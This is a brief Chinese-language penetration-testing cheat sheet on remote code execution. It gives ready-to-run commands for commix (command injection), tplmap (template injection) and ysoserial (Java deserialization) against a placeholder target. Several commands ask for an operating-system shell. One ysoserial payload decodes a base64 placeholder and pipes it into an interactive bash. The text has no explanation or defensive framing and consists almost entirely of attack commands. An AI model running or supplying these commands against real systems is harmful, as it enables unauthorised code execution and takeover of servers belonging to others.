# RCE 工具参考

## commix — 命令注入自动化

```bash
# 自动检测
commix -u "http://target.com/page?cmd=test"

# POST 请求
commix -u "http://target.com/page" --data="cmd=test"

# 获取 shell
commix -u "http://target.com/page?cmd=test" --os-shell
```

## tplmap — 模板注入自动化

```bash
# 模板注入检测
python tplmap.py -u "http://target.com/page?name=test"

# 获取 shell
python tplmap.py -u "http://target.com/page?name=test" --os-shell

# 指定引擎
python tplmap.py -u "http://target.com/page?name=test" -e jinja2
```

## ysoserial — Java 反序列化利用

```bash
# 生成 payload
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'

# 常用 gadget
CommonsCollections1-7
Jdk7u21
Spring1-2
Hibernate1-2
```
